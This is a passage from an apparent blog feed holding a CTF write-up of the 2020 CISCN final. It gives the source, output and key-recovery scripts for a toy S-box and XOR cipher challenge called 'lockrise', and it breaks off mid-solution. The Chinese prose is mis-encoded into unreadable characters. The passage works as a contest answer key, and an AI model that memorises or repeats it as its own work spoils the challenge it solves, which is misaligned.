            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 CISCN å›½èµ›æ€»å†³èµ› éƒ¨åˆ†è§£é¢˜å¤ç°</title>
      <link href="2020/10/06/CTF_2020CISCN_final/"/>
      <url>2020/10/06/CTF_2020CISCN_final/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¥½ä¸å®¹æ˜“ç»è¿‡çº¿ä¸Šåˆèµ›ã€åˆ†åŒºé€‰æ‹”èµ›ï¼Œç»ˆäºæœ‰æœºä¼šå»çº¿ä¸‹æ‰“äº†åœº CTF å›½èµ›ï¼Œæ„Ÿè°¢å¤§å¸ˆå‚…ä»¬å¸¦æˆ‘ç©~</p><p>è¾£é¸¡å¹³å°ï¼ˆylbnbï¼‰ä»€ä¹ˆçš„å°±ä¸åæ§½äº†ï¼Œæ€»çš„æ¥è¯´å›½èµ›å…¶å®è¿˜æŒºçˆ½çš„ 2333ï¼Œæ··åƒæ··å–åˆ’æ°´çš„æ˜¯æˆ‘äº†ã€‚</p><p>ç¬¬ä¸€å¤© AWD ä¸€å¼€å§‹è¢«æ‰“å¾—è´¼æƒ¨äº†ï¼Œä¸­é—´ä¿®å¹³å°è¿‡äº†ä¸€ä¸ªå°æ—¶ï¼Œæœ¬æ¥éƒ½æƒ³å¥½æ¥ä¸‹æ¥è¦æ€ä¹ˆæ‰“äº†ï¼Œæ¥ç€å¹³å°åˆå´©äº†è¿‡äº†å‡ ä¸ªå°æ—¶åƒäº†ä¸ªæ™šé¥­æœ€åè¯´ä¸æ‰“äº†ã€‚ã€‚<em>ï¼ˆç¬¬ä¸€æ¬¡æ­£å¼æ‰“ AWD å°±æ˜¯å›½èµ›äº†ä¹Ÿå¤ªæƒ¨äº†</em></p><p>ç¬¬äºŒå¤©æ”¹æˆäº†ä¸‰å°æ—¶ Break è§£é¢˜èµ› + ä¸¤å°æ—¶ Fixï¼Œè§£é¢˜åªä¼šç­¾åˆ°å˜¤å˜¤å˜¤ï¼ˆï¼ˆï¼ˆ</p><p>è¶ç€è¿˜æœ‰ç‚¹å°è±¡å°±æ¥å¤ç°å‡ ä¸ªé¢˜å§ã€‚</p><p><em>ï¼ˆçŸ¥é“äº†æˆ‘è‡ªå·±çˆªå·´</em></p><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="lockrise"><a href="#lockrise" class="headerlink" title="lockrise"></a>lockrise</h3><p><strong>Source:</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> DES<span class="token triple-quoted-string string">'''sbox=list(range(256))random.shuffle(sbox)print(sbox)'''</span>sbox<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">lock</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sbox<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">peak</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span>m<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">rise</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">len</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>    r<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r<span class="token punctuation">.</span>append<span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> rkey<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>secret<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>rise<span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>rise<span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lockrise:"</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"k0 ^ k7:"</span><span class="token punctuation">,</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>secret<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>rise<span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>rise<span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"encrypted:"</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span>d<span class="token operator">=</span>DES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret<span class="token punctuation">,</span>DES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">b"flagxxxxx...xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>Output:</strong> </p><pre class="language-none"><code class="language-none">lockrise: [158, 51, 193, 48, 114, 23, 164, 217]k0 ^ k7: 160encrypted: [32, 98, 40, 152, 125, 149, 87, 167]0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c</code></pre><p><strong>åŠ å¯†é€»è¾‘ï¼š</strong></p><p>input =&gt; sbox =&gt; right shift =&gt; xor key =&gt; sbox =&gt; right shift =&gt; xor key =&gt; output</p><p><strong>æ±‚è§£ flag é€»è¾‘ï¼š</strong></p><p>æ±‚è§£ key =&gt; æ ¹æ® key å’Œ encrypted åå‘è§£å‡º secret =&gt; ç”¨ secret ä½œå¯†é’¥ DES è§£å¯† flag</p><p>å†æ¥çœ‹åŠ å¯†è¿‡ç¨‹ï¼Œinput0 =&gt; sbox =&gt; right shift =&gt; xor k1 =&gt; sbox =&gt; right shift =&gt; xor k2 =&gt; output2.</p><p>åæ¨å¯ä»¥å¾—åˆ° input6 =&gt; sbox =&gt; right shift =&gt; <strong>xor k7</strong> =&gt; sbox =&gt; right shift =&gt; <strong>xor k0</strong> =&gt; output0.</p><p>è¿™æ ·æ ¹æ® <code>k0 ^ k7 = 160</code> å¯ä»¥çˆ†ç ´ <code>k0</code> &amp; <code>k7</code> äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">secret<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment"># [96, 25, 248, 51, 6, 37, 32, 69]</span></code></pre><p>å‰ä¸¤æ­¥éª¤åŠ å¯†éƒ½æ˜¯ç¡®å®šçš„ï¼Œå¯ä»¥ç›´æ¥ä»è¿™é‡Œå…¥æ‰‹äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">]</span>lockrise <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">]</span><span class="token keyword">for</span> k7 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    k0 <span class="token operator">=</span> <span class="token number">160</span> <span class="token operator">^</span> k7    <span class="token keyword">if</span> sbox<span class="token punctuation">[</span>r<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">^</span> k7<span class="token punctuation">]</span> <span class="token operator">^</span> k0 <span class="token operator">==</span> lockrise<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>k0<span class="token punctuation">,</span> k7<span class="token punctuation">)</span>        <span class="token comment"># 0 160</span></code></pre><p>å¾—åˆ° k0 å’Œ k7 åˆ†åˆ«ä¸º 0 å’Œ 160.</p><p>å†å°† k0 å¸¦å…¥æ±‚è§£ k1.</p><pre class="language-python" data-language="python"><code class="language-python">k0 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> sbox<span class="token punctuation">[</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> k0<span class="token punctuation">]</span> <span class="token operator">^</span> k1 <span class="token operator">==</span> lockrise<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>k1<span class="token punctuation">)</span>        <span class="token comment"># 180</span></code></pre><p>ä¾æ¬¡æ±‚è§£ä¸‹å»å³å¯å¾—åˆ°<code>key</code>ã€‚</p><p>æˆ–è€…å†™ä¸ªå¾ªç¯æ±‚ä¹Ÿè¡Œã€‚</p><pre class="language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> sbox<span class="token punctuation">[</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">^</span> k <span class="token operator">==</span> lockrise<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> k<span class="token punctuation">)</span>            key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment"># [0, 180, 224, 60, 139, 193, 154, 160]</span></code></pre><p>æ‰€ä»¥ <code>key</code> ä¸º <code>[0, 180, 224, 60, 139, 193, 154, 160]</code>ã€‚</p><p>è€Œååè¿‡æ¥æ±‚è§£ <code>secret</code>ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">inv_rise</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>    r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r<span class="token punctuation">.</span>append<span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">inv_peak</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># left shift</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">inv_lock</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sbox<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> rencrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">]</span>x <span class="token operator">=</span> inv_rise<span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> 